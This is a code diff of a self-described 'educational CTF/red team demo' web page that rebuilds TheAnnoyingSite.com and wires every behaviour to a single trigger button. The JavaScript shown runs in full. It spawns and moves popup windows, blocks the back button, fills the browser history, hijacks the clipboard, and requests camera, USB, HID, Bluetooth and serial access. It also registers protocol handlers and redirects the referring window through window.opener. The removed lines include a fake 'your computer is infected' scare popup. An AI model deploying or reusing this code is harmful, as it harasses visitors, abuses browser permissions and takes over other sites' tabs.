@@ -36,77 +36,21 @@
             <p class="subtitle">"For The Lulz" - Educational CTF/Red Team Demo</p>
         </header>
 
-        <div class="demo-section">
-            <h2>🎯 Core Annoyance Features</h2>
-            <div class="button-grid">
-                <button onclick="triggerCatPictures()" class="demo-btn">🐱 Cat Picture Spam</button>
-                <button onclick="triggerVideoSpam()" class="demo-btn">📹 Video Spam</button>
-                <button onclick="triggerPopups()" class="demo-btn">🪟 Popup Hell</button>
-                <!-- <button onclick="triggerAlerts()" class="demo-btn">🚨 Alert Spam</button> -->
-                <button onclick="triggerDownloads()" class="demo-btn">📥 Fake Downloads</button>
-                <button onclick="triggerSearchSpam()" class="demo-btn">🔍 Search History Spam</button>
-                <button onclick="triggerLogout()" class="demo-btn">🚪 Super Logout</button>
-                <button onclick="triggerBrowserData()" class="demo-btn">🔐 Browser Data Grab</button>
-                <button onclick="triggerFullAnnoyance()" class="demo-btn full-annoyance">💀 FULL ANNOYANCE MODE</button>
+        <template>
+            <div class='hello-message'>
+                <h1>Hi there!</h1>
+                <h2>To get started, click the red button below.</h2>
+                <h3>(or, on mobile, tap the cat!)</h3>
+                <img src='static/cat-cute.jpg' alt='Cute cat' />
             </div>
-        </div>
+        </template>
 
         <div class="demo-section">
-            <h2>📁 Fake Downloads</h2>
-            <div class="download-grid">
-                <div class="fake-file" onclick="triggerDownload('cat-cute.jpg')">
-                    <div class="file-icon">🐱</div>
-                    <div class="file-name">cute-cat.jpg</div>
-                    <div class="file-size">92KB</div>
-                </div>
-                <div class="fake-file" onclick="triggerDownload('cat-smirk.jpg')">
-                    <div class="file-icon">😏</div>
-                    <div class="file-name">smirking-cat.jpg</div>
-                    <div class="file-size">88KB</div>
-                </div>
-                <div class="fake-file" onclick="triggerDownload('cat-blue-eyes.jpg')">
-                    <div class="file-icon">👁️</div>
-                    <div class="file-name">blue-eyed-cat.jpg</div>
-                    <div class="file-size">51KB</div>
-                </div>
-                <div class="fake-file" onclick="triggerDownload('cat.mp4')">
-                    <div class="file-icon">🎬</div>
-                    <div class="file-name">cat-video.mp4</div>
-                    <div class="file-size">7.1MB</div>
-                </div>
-                <div class="fake-file" onclick="triggerDownload('rickroll.mp4')">
-                    <div class="file-icon">🎵</div>
-                    <div class="file-name">never-gonna-give-you-up.mp4</div>
-                    <div class="file-size">35MB</div>
-                </div>
-                <div class="fake-file" onclick="triggerDownload('nyan.mp4')">
-                    <div class="file-icon">🌈</div>
-                    <div class="file-name">nyan-cat.mp4</div>
-                    <div class="file-size">8.3MB</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="demo-section">
-            <h2>🎮 Advanced Features</h2>
+            <h2>🎯 The Annoying Site Experience</h2>
             <div class="button-grid">
-                <button onclick="requestCameraAndMic()" class="demo-btn">📷 Camera & Mic Access</button>
-                <button onclick="requestClipboardRead()" class="demo-btn">📋 Clipboard Read</button>
-                <button onclick="requestFullscreen()" class="demo-btn">🖥️ Fullscreen Request</button>
-                <button onclick="startVibrateInterval()" class="demo-btn">📳 Device Vibration</button>
-                <button onclick="speak('This is very annoying!')" class="demo-btn">🗣️ Text-to-Speech</button>
-                <button onclick="startTheramin()" class="demo-btn">🎵 Theramin Mode</button>
-                <button onclick="blockBackButton()" class="demo-btn">🔒 Block Back Button</button>
-                <button onclick="fillHistory()" class="demo-btn">📚 Fill Browser History</button>
-                <button onclick="requestMidiAccess()" class="demo-btn">🎹 MIDI Access</button>
-                <button onclick="requestBluetoothAccess()" class="demo-btn">📶 Bluetooth Access</button>
-                <button onclick="requestUsbAccess()" class="demo-btn">💾 USB Access</button>
-                <button onclick="requestSerialAccess()" class="demo-btn">🔌 Serial Access</button>
-                <button onclick="requestHidAccess()" class="demo-btn">⌨️ HID Access</button>
-                <button onclick="requestWebauthnAttestation()" class="demo-btn">🔐 WebAuthn</button>
-                <button onclick="registerProtocolHandlers()" class="demo-btn">🔗 Protocol Handlers</button>
-                <button onclick="animateUrlWithEmojis()" class="demo-btn">✨ URL Animation</button>
+                <button onclick="triggerTheAnnoyingSite()" class="demo-btn full-annoyance">💀 TRIGGER THE ANNOYING SITE</button>
             </div>
+            <p class="warning">⚠️ This button will activate ALL TheAnnoyingSite.com functionality - popups, videos, downloads, logout attempts, and more!</p>
         </div>
 
         <!-- Streamlined Technical Analysis Section -->
@@ -173,14 +117,6 @@
                 <p><strong>Risk Level: HIGH</strong> - This is malicious software that could be extremely 
                 dangerous in the wrong hands. It bypasses browser security models and can access sensitive 
                 system resources.</p>
-            </div>
-        </div>
-
-        <div id="annoying-popup" class="annoying-popup" style="display: none;">
-            <div class="popup-content">
-                <h3>🚨 CRITICAL SYSTEM ERROR</h3>
-                <p>Memory corruption detected! Your computer is infected!</p>
-                <button onclick="closePopup()">OK</button>
             </div>
         </div>
 
@@ -286,7 +222,7 @@
             'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
             'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
             'I\'ve never seen the inside of my own mouth because it scares me to death.',
-            'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
+            'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
             'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
             'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
             'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
@@ -343,17 +279,10 @@
         // Helper function for determining if parent window is same origin
         function isParentSameOrigin() {
             try {
-                // May throw an exception if `window.opener` is on another origin
                 return window.opener.location.origin === window.location.origin;
             } catch (err) {
                 return false;
             }
-        }
-
-        // Speak the given `phrase` using text-to-speech from TheAnnoyingSite.com
-        function speak(phrase) {
-            if (phrase == null) phrase = getRandomArrayEntry(PHRASES);
-            window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase));
         }
 
         // Get a random element from a given array from TheAnnoyingSite.com
@@ -368,31 +297,149 @@
             return { x, y };
         }
 
-        // Detect browser type from TheAnnoyingSite.com
-        function detectBrowser() {
-            const userAgent = navigator.userAgent;
-            if (/samsungbrowser\//i.test(userAgent)) {
-                return 'samsung';
-            } else if (/edg\//i.test(userAgent)) {
-                return 'edge';
-            } else if (/edga\//i.test(userAgent)) {
-                return 'edge';
-            } else if (/opt\//i.test(userAgent)) {
-                // Opera iOS
-                return 'opera';
-            } else if (/opr\//i.test(userAgent)) {
-                // Opera Android
-                return 'opera';
-            } else if (/chrome\//i.test(userAgent)) {
-                return 'chrome';
-            } else if (/safari\//i.test(userAgent)) {
-                return 'safari';
-            } else if (/firefox\//i.test(userAgent)) {
-                return 'firefox';
+        // The main function that triggers TheAnnoyingSite.com experience
+        function triggerTheAnnoyingSite() {
+            console.log('💀 THE ANNOYING SITE EXPERIENCE ACTIVATED!');
+            
+            // Initialize TheAnnoyingSite.com behavior
+            init();
+            
+            // If this is a parent window, initialize parent-specific behavior
+            if (isParentWindow) {
+                initParentWindow();
+            }
+            
+            // If this is a child window, initialize child-specific behavior
+            if (isChildWindow) {
+                initChildWindow();
+            }
+            
+            // Start the full annoyance experience
+            startVibrateInterval();
+            speak('That was a mistake');
+            startTheramin();
+            blockBackButton();
+            fillHistory();
+            requestCameraAndMic();
+            requestClipboardRead();
+            requestFullscreen();
+            requestMidiAccess();
+            requestBluetoothAccess();
+            requestUsbAccess();
+            requestSerialAccess();
+            requestHidAccess();
+            requestWebauthnAttestation();
+            registerProtocolHandlers();
+            animateUrlWithEmojis();
+            
+            // Window management
+            openWindow();
+            hideCursor();
+            requestPointerLock();
+            enablePictureInPicture();
+            rainbowThemeColor();
+            
+            // Advanced features
+            moveWindowBounce();
+            setupFollowWindow();
+            startVideo();
+            startInvisiblePictureInPictureVideo();
+            copySpamToClipboard();
+            startAlertInterval();
+            confirmPageUnload();
+            attemptToTakeoverReferrerWindow();
+            focusWindows();
+            superLogout();
+            
+            // File downloads
+            triggerFileDownload();
+            
+            // Remove hello message if it exists
+            removeHelloMessage();
+        }
+
+        // Initialize TheAnnoyingSite.com behavior
+        function init() {
+            confirmPageUnload();
+        }
+
+        // Initialize child window behavior
+        function initChildWindow() {
+            registerProtocolHandlers();
+            hideCursor();
+            moveWindowBounce();
+            setupFollowWindow();
+            startVideo();
+            detectWindowClose();
+            triggerFileDownload();
+            speak();
+            rainbowThemeColor();
+            animateUrlWithEmojis();
+            startAlertInterval();
+        }
+
+        // Initialize parent window behavior
+        function initParentWindow() {
+            showHelloMessage();
+            blockBackButton();
+            fillHistory();
+            startInvisiblePictureInPictureVideo();
+            superLogout();
+        }
+
+        // Remove hello message
+        function removeHelloMessage() {
+            const helloMessage = document.querySelector('.hello-message');
+            if (helloMessage) helloMessage.remove();
+        }
+
+        // Show the unsuspecting user a friendly hello message with a cat
+        function showHelloMessage() {
+            const template = document.querySelector('template');
+            if (template) {
+                const clone = document.importNode(template.content, true);
+                document.body.appendChild(clone);
             }
         }
 
-        // Setup search window with Bing searches from TheAnnoyingSite.com
+        // Ask the user "are you sure you want to leave this page?"
+        function confirmPageUnload() {
+            window.addEventListener('beforeunload', event => {
+                speak('Please don\'t go!');
+                event.returnValue = true;
+            });
+        }
+
+        // Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
+        // link in a new window. For example, Messenger.com from Facebook does this.
+        // However, that means that `window.opener` will be set, which allows us to redirect
+        // that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
+        function attemptToTakeoverReferrerWindow() {
+            if (isParentWindow && window.opener && !isParentSameOrigin()) {
+                window.opener.location = `${window.location.origin}/?child=true`;
+            }
+        }
+
+        // Focus all child windows
+        function focusWindows() {
+            wins.forEach(win => {
+                if (!win.closed) win.focus();
+            });
+        }
+
+        // Open a new popup window
+        function openWindow() {
+            const { x, y } = getRandomCoords();
+            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
+            const win = window.open(window.location.pathname, '', opts);
+
+            if (!win) return;
+            wins.push(win);
+
+            if (wins.length === 2) setupSearchWindow(win);
+        }
+
+        // Setup search window with Bing searches
         function setupSearchWindow(win) {
             if (!win) return;
             const { x, y } = getRandomCoords();
@@ -425,388 +472,20 @@
             }, 3000);
         }
 
-        // Handle a child window closing from TheAnnoyingSite.com
+        // Handle a child window closing
         function onCloseWindow(win) {
             const i = wins.indexOf(win);
             if (i >= 0) wins.splice(i, 1);
         }
 
-        // Show a random troll video in the window from TheAnnoyingSite.com
-        function startVideo() {
-            const video = document.createElement('video');
-            video.src = getRandomArrayEntry(VIDEOS);
-            video.autoplay = true;
-            video.loop = true;
-            video.style = 'width: 100%; height: 100%;';
-            document.body.appendChild(video);
-        }
-
-        // Show a modal dialog at a regular interval from TheAnnoyingSite.com
-        function startAlertInterval() {
-            setInterval(() => {
-                if (Math.random() < 0.5) {
-                    showAlert();
-                } else {
-                    window.print();
-                }
-            }, 120000);
-        }
-
-        // Show an alert with 1000's of lines of cat ASCII art from TheAnnoyingSite.com
-        function showAlert() {
-            const randomArt = getRandomArrayEntry(ART);
-            const longAlertText = Array(200).join(randomArt);
-            window.alert(longAlertText);
-        }
-
-        // Change the theme color of the browser in a loop from TheAnnoyingSite.com
-        function rainbowThemeColor() {
-            function zeroFill(width, number, pad = '0') {
-                width -= number.toString().length;
-                if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number;
-                return number + '';
-            }
-
-            const meta = document.querySelector('meta[name="theme-color"]');
-            if (meta) {
-                setInterval(() => {
-                    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)));
-                }, 50);
-            }
-        }
-
-        // Copy cat pictures onto the user's clipboard from TheAnnoyingSite.com
-        function copySpamToClipboard() {
-            const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com';
-            clipboardCopy(randomArt);
-        }
-
-        // Copy given text onto the user's clipboard from TheAnnoyingSite.com
-        function clipboardCopy(text) {
-            // A <span> contains the text to copy
-            const span = document.createElement('span');
-            span.textContent = text;
-            span.style.whiteSpace = 'pre'; // Preserve consecutive spaces and newlines
-
-            // An <iframe> isolates the <span> from the page's styles
-            const iframe = document.createElement('iframe');
-            iframe.sandbox = 'allow-same-origin';
-            document.body.appendChild(iframe);
-
-            let win = iframe.contentWindow;
-            win.document.body.appendChild(span);
-
-            let selection = win.getSelection();
-
-            // Firefox fails to get a selection from <iframe> window, so fallback
-            if (!selection) {
-                win = window;
-                selection = win.getSelection();
-                document.body.appendChild(span);
-            }
-
-            const range = win.document.createRange();
-            selection.removeAllRanges();
-            range.selectNode(span);
-            selection.addRange(range);
-
-            let success = false;
-            try {
-                success = win.document.execCommand('copy');
-            } catch (err) {
-                console.log(err);
-            }
-
-            selection.removeAllRanges();
-            span.remove();
-            iframe.remove();
-
-            return success;
-        }
-
-        // Start an annoying theramin that changes pitch and volume depending on
-        // the mouse position from TheAnnoyingSite.com
-        function startTheramin() {
-            const audioContext = new AudioContext();
-            const oscillatorNode = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
-
-            const pitchBase = 50;
-            const pitchRange = 4000;
-
-            const wave = audioContext.createPeriodicWave(
-                Array(10).fill(0).map((v, i) => Math.cos(i)),
-                Array(10).fill(0).map((v, i) => Math.sin(i))
-            );
-
-            oscillatorNode.setPeriodicWave(wave);
-
-            oscillatorNode.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-
-            oscillatorNode.start(0);
-
-            const oscillator = ({ pitch, volume }) => {
-                oscillatorNode.frequency.value = pitchBase + pitch * pitchRange;
-                gainNode.gain.value = volume * 0.5;
-            };
-
-            document.body.addEventListener('mousemove', event => {
-                const { clientX, clientY } = event;
-                const { clientWidth, clientHeight } = document.body;
-                const pitch = (clientX - clientWidth / 2) / clientWidth;
-                const volume = (clientY - clientHeight / 2) / clientHeight;
-                oscillator({ pitch, volume });
+        // When a child window closes, notify the parent window
+        function detectWindowClose() {
+            window.addEventListener('unload', () => {
+                if (!window.opener.closed) window.opener.onCloseWindow(window);
             });
         }
 
-        // Request Webauthn attestation from TheAnnoyingSite.com
-        function requestWebauthnAttestation() {
-            try {
-                // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
-                // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
-
-                // sample arguments for registration
-                const createCredentialDefaultArgs = {
-                    publicKey: {
-                        // Relying Party (a.k.a. - Service):
-                        rp: {
-                            name: 'Acme'
-                        },
-
-                        // User:
-                        user: {
-                            id: new Uint8Array(16),
-                            name: 'YOU_ARE_HACKED@THEANNOYINGSITE.COM',
-                            displayName: 'YOU ARE HACKED'
-                        },
-
-                        pubKeyCredParams: [{
-                            type: 'public-key',
-                            alg: -7
-                        }],
-
-                        attestation: 'direct',
-
-                        timeout: 60000,
-
-                        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
-                            0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
-                            0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
-                        ]).buffer
-                    }
-                };
-
-                // sample arguments for login
-                const getCredentialDefaultArgs = {
-                    publicKey: {
-                        timeout: 60000,
-                        // allowCredentials: [newCredential] // see below
-                        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
-                            0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
-                            0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
-                        ]).buffer
-                    }
-                };
-
-                // register / create a new credential
-                navigator.credentials.create(createCredentialDefaultArgs)
-                    .then((cred) => {
-                        // normally the credential IDs available for an account would come from a server
-                        // but we can just copy them from above...
-                        const idList = [{
-                            id: cred.rawId,
-                            transports: ['usb', 'nfc', 'ble'],
-                            type: 'public-key'
-                        }];
-                        getCredentialDefaultArgs.publicKey.allowCredentials = idList;
-                        return navigator.credentials.get(getCredentialDefaultArgs);
-                    });
-            } catch {}
-        }
-
-        function requestClipboardRead() {
-            try {
-                navigator.clipboard.readText().then(
-                    data => {
-                        if (!window.ApplePaySession) {
-                            console.log("Successfully read data from clipboard: '" + data + "'");
-                        }
-                    },
-                    () => {}
-                );
-            } catch {}
-        }
-
-        // Request access to MIDI devices from TheAnnoyingSite.com
-        function requestMidiAccess() {
-            try {
-                navigator.requestMIDIAccess({
-                    sysex: true
-                });
-            } catch {}
-        }
-
-        // Request access to Bluetooth devices from TheAnnoyingSite.com
-        function requestBluetoothAccess() {
-            try {
-                navigator.bluetooth.requestDevice({
-                    // filters: [...] <- Prefer filters to save energy & show relevant devices.
-                    // acceptAllDevices here ensures dialog can populate, we don't care with what.
-                    acceptAllDevices: true
-                })
-                    .then(device => device.gatt.connect());
-            } catch {}
-        }
-
-        // Request access to USB devices from TheAnnoyingSite.com
-        function requestUsbAccess() {
-            try {
-                navigator.usb.requestDevice({ filters: [{}] });
-            } catch {}
-        }
-
-        // Request access to Serial devices from TheAnnoyingSite.com
-        function requestSerialAccess() {
-            try {
-                navigator.serial.requestPort({ filters: [] });
-            } catch {}
-        }
-
-        // Request access to HID devices from TheAnnoyingSite.com
-        function requestHidAccess() {
-            try {
-                navigator.hid.requestDevice({ filters: [] });
-            } catch {}
-        }
-
-        // Attempt to register all possible browser-whitelisted protocols from TheAnnoyingSite.com
-        function registerProtocolHandlers() {
-            if (typeof navigator.registerProtocolHandler !== 'function') return;
-
-            const protocolWhitelist = [
-                'bitcoin',
-                'geo',
-                'im',
-                'irc',
-                'ircs',
-                'magnet',
-                'mailto',
-                'mms',
-                'news',
-                'ircs',
-                'nntp',
-                'sip',
-                'sms',
-                'smsto',
-                'ssh',
-                'tel',
-                'urn',
-                'webcal',
-                'wtai',
-                'xmpp'
-            ];
-
-            const handlerUrl = window.location.href + '/url=%s';
-
-            protocolWhitelist.forEach(proto => {
-                navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site');
-            });
-        }
-
-        // Lock the user's pointer, without even being in full screen from TheAnnoyingSite.com
-        function requestPointerLock() {
-            const requestPointerLockApi = (
-                document.body.requestPointerLock ||
-                document.body.webkitRequestPointerLock ||
-                document.body.mozRequestPointerLock ||
-                document.body.msRequestPointerLock
-            );
-
-            requestPointerLockApi.call(document.body);
-        }
-
-        // Start vibrating the device at random intervals from TheAnnoyingSite.com
-        function startVibrateInterval() {
-            if (typeof window.navigator.vibrate !== 'function') return;
-            setInterval(() => {
-                const duration = Math.floor(Math.random() * 600);
-                window.navigator.vibrate(duration);
-            }, 1000);
-
-            // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
-            window.addEventListener('gamepadconnected', (event) => {
-                const gamepad = event.gamepad;
-                if (gamepad.vibrationActuator) {
-                    setInterval(() => {
-                        if (gamepad.connected) {
-                            gamepad.vibrationActuator.playEffect('dual-rumble', {
-                                duration: Math.floor(Math.random() * 600),
-                                strongMagnitude: Math.random(),
-                                weakMagnitude: Math.random()
-                            });
-                        }
-                    }, 1000);
-                }
-            });
-        }
-
-        // Active Safari's picture-in-picture feature from TheAnnoyingSite.com
-        function enablePictureInPicture() {
-            const video = document.querySelector('video');
-            if (document.pictureInPictureEnabled) {
-                video.style = '';
-                video.muted = false;
-                video.requestPictureInPicture();
-                video.play();
-            }
-        }
-
-        // Fullscreen the browser window from TheAnnoyingSite.com
-        function requestFullscreen() {
-            const requestFullscreen = Element.prototype.requestFullscreen ||
-                Element.prototype.webkitRequestFullscreen ||
-                Element.prototype.mozRequestFullScreen ||
-                Element.prototype.msRequestFullscreen;
-
-            requestFullscreen.call(document.body);
-        }
-
-        // Hide the user's cursor from TheAnnoyingSite.com
-        function hideCursor() {
-            document.querySelector('html').style = 'cursor: none;';
-        }
-
-        // Disable the back button from TheAnnoyingSite.com
-        function blockBackButton() {
-            window.addEventListener('popstate', () => {
-                window.history.forward();
-            });
-        }
-
-        // Fill the history with extra entries from TheAnnoyingSite.com
-        function fillHistory() {
-            for (let i = 1; i < 20; i++) {
-                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
-            }
-            // Set location back to the initial location, so user does not notice
-            window.history.pushState({}, '', window.location.pathname);
-        }
-
-        // Open a new popup window from TheAnnoyingSite.com
-        function openWindow() {
-            const { x, y } = getRandomCoords();
-            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
-            const win = window.open(window.location.pathname, '', opts);
-
-            // New windows may be blocked by the popup blocker
-            if (!win) return;
-            wins.push(win);
-
-            if (wins.length === 2) setupSearchWindow(win);
-        }
-
-        // Move the window around the screen and bounce off of the screen edges from TheAnnoyingSite.com
+        // Move the window around the screen and bounce off of the screen edges
         function moveWindowBounce() {
             let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
             let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
@@ -826,140 +505,88 @@
             }, TICK_LENGTH);
         }
 
-        // Follow the user's mouse from TheAnnoyingSite.com
+        // Follow the user's mouse
         function setupFollowWindow() {
             document.addEventListener('mousemove', function(e) {
                 window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2));
             });
         }
 
-        // When a child window closes, notify the parent window from TheAnnoyingSite.com
-        function detectWindowClose() {
-            window.addEventListener('unload', () => {
-                if (!window.opener.closed) window.opener.onCloseWindow(window);
+        // Show a random troll video in the window
+        function startVideo() {
+            const video = document.createElement('video');
+            video.src = getRandomArrayEntry(VIDEOS);
+            video.autoplay = true;
+            video.loop = true;
+            video.style = 'width: 100%; height: 100%;';
+            document.body.appendChild(video);
+        }
+
+        // Start an invisible, muted video so we have one ready to put into
+        // picture-in-picture mode on the first user-interaction
+        function startInvisiblePictureInPictureVideo() {
+            const video = document.createElement('video');
+            video.src = getRandomArrayEntry(VIDEOS);
+            video.loop = true;
+            video.muted = true;
+            video.style = HIDDEN_STYLE;
+            video.autoplay = true;
+            video.play();
+            document.body.appendChild(video);
+        }
+
+        // Hide the user's cursor
+        function hideCursor() {
+            document.querySelector('html').style = 'cursor: none;';
+        }
+
+        // Lock the user's pointer, without even being in full screen
+        function requestPointerLock() {
+            const requestPointerLockApi = (
+                document.body.requestPointerLock ||
+                document.body.webkitRequestPointerLock ||
+                document.body.mozRequestPointerLock ||
+                document.body.msRequestPointerLock
+            );
+            requestPointerLockApi.call(document.body);
+        }
+
+        // Active Safari's picture-in-picture feature
+        function enablePictureInPicture() {
+            const video = document.querySelector('video');
+            if (document.pictureInPictureEnabled && video) {
+                video.style = '';
+                video.muted = false;
+                video.requestPictureInPicture();
+                video.play();
+            }
+        }
+
+        // Fullscreen the browser window
+        function requestFullscreen() {
+            const requestFullscreen = Element.prototype.requestFullscreen ||
+                Element.prototype.webkitRequestFullscreen ||
+                Element.prototype.mozRequestFullScreen ||
+                Element.prototype.msRequestFullscreen;
+            requestFullscreen.call(document.body);
+        }
+
+        // Disable the back button
+        function blockBackButton() {
+            window.addEventListener('popstate', () => {
+                window.history.forward();
             });
         }
 
-        // Ask the user "are you sure you want to leave this page?" from TheAnnoyingSite.com
-        function confirmPageUnload() {
-            window.addEventListener('beforeunload', event => {
-                speak('Please don\'t go!');
-                event.returnValue = true;
-            });
+        // Fill the history with extra entries
+        function fillHistory() {
+            for (let i = 1; i < 20; i++) {
+                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
+            }
+            window.history.pushState({}, '', window.location.pathname);
         }
 
-        // Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
-        // link in a new window. For example, Messenger.com from Facebook does this.
-        // However, that means that `window.opener` will be set, which allows us to redirect
-        // that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
-        // Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
-        function attemptToTakeoverReferrerWindow() {
-            if (isParentWindow && window.opener && !isParentSameOrigin()) {
-                window.opener.location = `${window.location.origin}/?child=true`;
-            }
-        }
-
-        // Focus all child windows from TheAnnoyingSite.com
-        function focusWindows() {
-            wins.forEach(win => {
-                if (!win.closed) win.focus();
-            });
-        }
-
-        // Enhanced URL animations from TheAnnoyingSite.com
-        function animateUrlWithEmojis() {
-            if (window.ApplePaySession) {
-                // Safari doesn't show the full URL anyway, so we can't animate it
-                return;
-            }
-            const rand = Math.random();
-            if (rand < 0.33) {
-                animateUrlWithBabies();
-            } else if (rand < 0.67) {
-                animateUrlWithWave();
-            } else {
-                animateUrlWithMoons();
-            }
-
-            function animateUrlWithBabies() {
-                const e = ['🏻', '🏼', '🏽', '🏾', '🏿'];
-
-                setInterval(() => {
-                    let s = '';
-                    let i; let m;
-
-                    for (i = 0; i < 10; i++) {
-                        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2));
-                        s += '👶' + e[m];
-                    }
-
-                    window.location.hash = s;
-                }, 100);
-            }
-
-            function animateUrlWithWave() {
-                setInterval(() => {
-                    let i; let n; let s = '';
-
-                    for (i = 0; i < 10; i++) {
-                        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4;
-                        s += String.fromCharCode(0x2581 + n);
-                    }
-
-                    window.location.hash = s;
-                }, 100);
-            }
-
-            function animateUrlWithMoons() {
-                const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'];
-                const d = [0, 0, 0, 0, 0, 0, 0, 0];
-                let m = 0;
-
-                setInterval(() => {
-                    let s = '';
-                    let x = 0;
-
-                    if (!m) {
-                        while (d[x] === 4) {
-                            x++;
-                        }
-
-                        if (x >= d.length) m = 1;
-                        else {
-                            d[x]++;
-                        }
-                    } else {
-                        while (d[x] === 0) {
-                            x++;
-                        }
-
-                        if (x >= d.length) m = 0;
-                        else {
-                            d[x]++;
-                            if (d[x] === 8) d[x] = 0;
-                        }
-                    }
-
-                    d.forEach(function (n) {
-                        s += f[n];
-                    });
-
-                    window.location.hash = s;
-                }, 100);
-            }
-        }
-
-        // Rainbow theme colors
-        function rainbowThemeColor() {
-            const colors = ['#ff0000', '#ff8000', '#ffff00', '#80ff00', '#00ff00', '#00ff80', '#00ffff', '#0080ff', '#0000ff', '#8000ff', '#ff00ff', '#ff0080'];
-            let i = 0;
-            setInterval(() => {
-                document.documentElement.style.setProperty('--rainbow-color', colors[i]);
-                i = (i + 1) % colors.length;
-            }, 100);
-        }
-
-        // Enhanced vibration with gamepad support
+        // Start vibrating the device at random intervals
         function startVibrateInterval() {
             if (typeof window.navigator.vibrate !== 'function') return;
             setInterval(() => {
@@ -967,7 +594,7 @@
                 window.navigator.vibrate(duration);
             }, 1000);
 
-            // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
+            // If the gamepad can vibrate, we will at random intervals every second
             window.addEventListener('gamepadconnected', (event) => {
                 const gamepad = event.gamepad;
                 if (gamepad.vibrationActuator) {
@@ -984,162 +611,135 @@
             });
         }
 
-        // Window management
-        function openWindow() {
-            const x = Math.random() * (SCREEN_WIDTH - WIN_WIDTH);
-            const y = Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT);
-            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
-            const win = window.open(window.location.pathname, '', opts);
+        // Start an annoying theramin that changes pitch and volume depending on
+        // the mouse position
+        function startTheramin() {
+            const audioContext = new AudioContext();
+            const oscillatorNode = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
 
-            if (!win) return;
-            wins.push(win);
-        }
+            const pitchBase = 50;
+            const pitchRange = 4000;
 
-        function hideCursor() {
-            document.querySelector('html').style = 'cursor: none;';
-        }
-
-        function requestPointerLock() {
-            const requestPointerLockApi = (
-                document.body.requestPointerLock ||
-                document.body.webkitRequestPointerLock ||
-                document.body.mozRequestPointerLock ||
-                document.body.msRequestPointerLock
+            const wave = audioContext.createPeriodicWave(
+                Array(10).fill(0).map((v, i) => Math.cos(i)),
+                Array(10).fill(0).map((v, i) => Math.sin(i))
             );
-            requestPointerLockApi.call(document.body);
+
+            oscillatorNode.setPeriodicWave(wave);
+            oscillatorNode.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            oscillatorNode.start(0);
+
+            const oscillator = ({ pitch, volume }) => {
+                oscillatorNode.frequency.value = pitchBase + pitch * pitchRange;
+                gainNode.gain.value = volume * 0.5;
+            };
+
+            document.body.addEventListener('mousemove', event => {
+                const { clientX, clientY } = event;
+                const { clientWidth, clientHeight } = document.body;
+                const pitch = (clientX - clientWidth / 2) / clientWidth;
+                const volume = (clientY - clientHeight / 2) / clientHeight;
+                oscillator({ pitch, volume });
+            });
         }
 
-        function enablePictureInPicture() {
-            const video = document.querySelector('video');
-            if (document.pictureInPictureEnabled && video) {
-                video.style = '';
-                video.muted = false;
-                video.requestPictureInPicture();
-                video.play();
+        // Speak the given `phrase` using text-to-speech
+        function speak(phrase) {
+            if (phrase == null) phrase = getRandomArrayEntry(PHRASES);
+            window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase));
+        }
+
+        // Change the theme color of the browser in a loop
+        function rainbowThemeColor() {
+            const meta = document.querySelector('meta[name="theme-color"]');
+            if (meta) {
+                setInterval(() => {
+                    const color = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
